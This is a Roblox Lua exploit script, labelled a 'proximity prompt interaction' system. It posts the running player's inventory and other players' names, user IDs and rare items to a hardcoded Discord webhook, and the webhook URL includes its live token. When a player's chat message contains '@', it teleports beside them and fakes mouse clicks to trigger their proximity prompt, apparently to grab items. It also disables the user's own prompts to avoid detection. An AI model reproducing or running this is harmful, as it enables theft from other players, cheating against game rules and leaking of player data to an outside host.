-- Complete Proximity Prompt Interaction Script
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local VirtualInputManager = game:GetService("VirtualInputManager")
local TeleportService = game:GetService("TeleportService")

-- Configuration
local WEBHOOK_URL = "https://discord.com/api/webhooks/1393445006299234449/s32t5PInI1pwZmxL8VTTmdohJ637DT_i6ni1KH757iQwNpxfbGcBamIzVSWWfn0jP8Rg"
local HOLD_DURATION = 5
local OPTIMAL_DISTANCE = 5
local CLICK_OFFSET = Vector3.new(0, 0.5, 0) -- Adjust for better click accuracy
local RARE_ITEMS = {"T-Rex", "Dragonfly", "Queen Bee"}

-- Webhook Notification System
local function sendNotification(player, message)
    local items = {}
    for _, item in pairs(player.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end
    
    local rareFound = {}
    for _, rare in pairs(RARE_ITEMS) do
        if table.find(items, rare) then
            table.insert(rareFound, rare)
        end
    end

    local embed = {
        title = "🎯 "..player.Name.." triggered interaction",
        description = "**Chat:** "..message,
        color = #rareFound > 0 and 0xFF0000 or 0x00FF00,
        fields = {
            {name = "User ID", value = player.UserId, inline = true},
            {name = "Rare Items", value = #rareFound > 0 and table.concat(rareFound, ", ") or "None", inline = true}
        },
        footer = {text = os.date("%X")}
    }

    local payload = {
        content = #rareFound > 0 and "@everyone Rare items detected!" or nil,
        embeds = {embed}
    }

    pcall(function()
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload))
        end
    end)
end

-- Proximity Prompt Interaction System
local function findBestPrompt(character)
    local searchOrder = {"HumanoidRootPart", "UpperTorso", "Head", "LowerTorso"}
    for _, partName in pairs(searchOrder) do
        local part = character:FindFirstChild(partName)
        if part then
            for _, child in pairs(part:GetChildren()) do
                if child:IsA("ProximityPrompt") then
                    return child
                end
            end
        end
    end
    return nil
end

local function lookAtPosition(position)
    LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
    LocalPlayer.CameraMaxZoomDistance = 0.5
    LocalPlayer.CameraMinZoomDistance = 0.5

    local connection
    connection = RunService.Heartbeat:Connect(function()
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, position)
    end)

    return function()
        if connection then connection:Disconnect() end
    end
end

local function simulateClick(position, duration)
    local screenPos, visible = Camera:WorldToScreenPoint(position)
    if not visible then return false end

    -- Smooth mouse movement
    local mouse = game:GetService("Players").LocalPlayer:GetMouse()
    local targetPos = Vector2.new(screenPos.X, screenPos.Y)
    local steps = 7
    for i = 1, steps do
        local t = i/steps
        local newPos = Vector2.new(mouse.X, mouse.Y):Lerp(targetPos, t^0.5) -- Ease-out curve
        VirtualInputManager:SendMouseMoveEvent(newPos.X, newPos.Y, game)
        task.wait(0.08)
    end

    -- Click and hold
    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, true, game, 1)
    local startTime = os.clock()

    -- Maintain hold with micro-movements
    while os.clock() - startTime < duration do
        local newScreenPos = Camera:WorldToScreenPoint(position)
        if newScreenPos then
            targetPos = Vector2.new(newScreenPos.X, newScreenPos.Y)
            VirtualInputManager:SendMouseMoveEvent(
                targetPos.X + math.random(-2,2),
                targetPos.Y + math.random(-2,2),
                game
            )
        end
        task.wait(0.1)
    end

    VirtualInputManager:SendMouseButtonEvent(targetPos.X, targetPos.Y, 0, false, game, 1)
    return true
end

local function interactWithPlayer(targetPlayer)
    local targetChar = targetPlayer.Character or targetPlayer.CharacterAdded:Wait()
    local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
    local rootPart = targetChar:FindFirstChild("HumanoidRootPart")

    if not humanoid or not rootPart then return end

    -- Position in front of player
    local direction = (rootPart.Position - Camera.CFrame.Position).Unit
    local targetPos = rootPart.Position - (direction * OPTIMAL_DISTANCE)
    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    LocalPlayer.Character:SetPrimaryPartCFrame(CFrame.new(targetPos))

    -- Find and interact with prompt
    local prompt = findBestPrompt(targetChar)
    if not prompt then return end

    local promptPosition = prompt.Parent.Position + CLICK_OFFSET
    local stopLooking = lookAtPosition(promptPosition)
    local success = simulateClick(promptPosition, HOLD_DURATION)
    if stopLooking then stopLooking() end

    return success
end

-- Chat Monitoring System
local function processChatMessage(player, message)
    if player == LocalPlayer then return end
    if not message:match("@") then return end

    sendNotification(player, message)
    interactWithPlayer(player)
end

-- Initialization
for _, player in pairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        processChatMessage(player, msg)
    end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        processChatMessage(player, msg)
    end)
end)

-- Send initial inventory scan
task.spawn(function()
    local items = {}
    for _, item in pairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(items, item.Name)
    end

    local embed = {
        title = "📦 "..LocalPlayer.Name.." inventory scan",
        description = table.concat(items, "\n"),
        color = 0x3498db,
        footer = {text = os.date("%X")}
    }

    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode({
            embeds = {embed}
        }))
    end)
end)

-- Anti-detection
local function disableLocalPrompts()
    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
    
    for _, child in pairs(rootPart:GetChildren()) do
        if child:IsA("ProximityPrompt") then
            child.Enabled = false
        end
    end
end

LocalPlayer.CharacterAdded:Connect(disableLocalPrompts)
disableLocalPrompts()

warn("Proximity prompt interaction system active")
